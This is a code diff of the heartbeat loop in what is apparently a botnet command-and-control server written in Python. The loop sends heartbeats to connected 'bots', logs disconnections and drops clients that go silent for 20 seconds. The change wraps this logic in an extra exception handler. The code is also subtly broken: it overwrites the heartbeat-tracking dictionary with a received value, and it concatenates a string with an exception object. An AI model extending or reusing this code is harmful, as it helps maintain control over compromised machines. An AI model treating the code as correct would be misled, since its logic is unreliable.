@@ -219,27 +219,30 @@ def tcplink():
         #     # sock.close()
         #     # datasock_list.remove(sock)
         #     break
-        if settings_data['BotNet']['Heartbeat']:
-            for sock in list(last_Heartbeat.keys()):
-                No = [k for k,v in datasock_list.items() if v==sock][0]
-                def disconnected(_type):
-                    History_write(f"Bot No.{No} disconnected.", _type)
-                    sock.close()
-                    del datasock_list[No]
-                    del last_Heartbeat[sock]
-                try:
-                    if time.time() - last_Heartbeat[sock] > 20:  # 20秒内没有收到心跳消息，判断客户端掉线
-                        disconnected('I')
+        try:
+            if settings_data['BotNet']['Heartbeat']:
+                for sock in list(last_Heartbeat.keys()):
+                    No = [k for k,v in datasock_list.items() if v==sock][0]
+                    def disconnected(_type):
+                        History_write(f"Bot No.{No} disconnected.", _type)
+                        sock.close()
+                        del datasock_list[No]
+                        del last_Heartbeat[sock]
+                    try:
+                        if time.time() - last_Heartbeat[sock] > 20:  # 20秒内没有收到心跳消息，判断客户端掉线
+                            disconnected('I')
+                            break
+                        send('heartbeat')  # 发送心跳消息
+                        last_Heartbeat = recv('Time')
+                        time.sleep(5)  # 每隔5秒发送一次心跳消息
+                    except Exception as e:
+                        print_error(f'Error of No.{No} : {e}')
+                        disconnected('E')
                         break
-                    send('heartbeat')  # 发送心跳消息
-                    last_Heartbeat = recv('Time')
-                    time.sleep(5)  # 每隔5秒发送一次心跳消息
-                except Exception as e:
-                    print_error(f'Error of No.{No} : {e}')
-                    disconnected('E')
-                    break
-        else:
-            return True
+            else:
+                return True
+        except Exception as e:
+            print_error('An error occured: ' + e)
 # 启动socket
 def run():
     while True:
